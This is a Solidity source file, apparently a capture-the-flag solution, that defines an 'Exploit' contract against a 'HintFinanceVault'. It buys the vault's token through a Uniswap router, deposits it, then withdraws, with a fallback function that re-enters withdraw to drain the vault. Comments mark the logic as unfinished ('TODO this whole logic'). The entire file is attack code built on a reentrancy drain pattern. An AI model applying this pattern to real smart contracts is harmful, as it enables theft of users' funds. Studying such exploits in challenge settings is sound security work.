// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.16;

import "./HintFinanceVault.sol";
import "./Setup.sol";

contract Exploit {
  	HintFinanceVault public vault;

	UniswapV2RouterLike private router = UniswapV2RouterLike(
		0xf164fC0Ec4E93095b804a4795bBe1e041497b92a
	);
    address private weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
	address private token; 

  	// initialise the etherStore variable with the contract address
  	constructor(address _vaultAddr) {
      	vault = HintFinanceVault(_vaultAddr);
		token = vault.underlyingToken();
  	}
	
	uint256 private hackAmount;
  	// NOTE trying to hack only 1 vault
  	function hackEet() public payable {
        address[] memory path = new address[](2);
        path[0] = weth;
		path[1] = token;
        router.swapExactETHForTokens{value: 1 ether}(
			0, path, address(this), block.timestamp
		);
		ERC20Like(token).approve(address(vault), (2**256)-1);
		hackAmount = ERC20Like(token).balanceOf(address(this));
      	vault.deposit(hackAmount);

      	vault.withdraw(hackAmount);
  	}

  // fallback function - where the magic happens
  // TODO this whole logic
  	fallback() external payable  {
		if(ERC20Like(token).balanceOf(address(vault)) >= hackAmount)
			vault.withdraw(hackAmount);
  	}
}

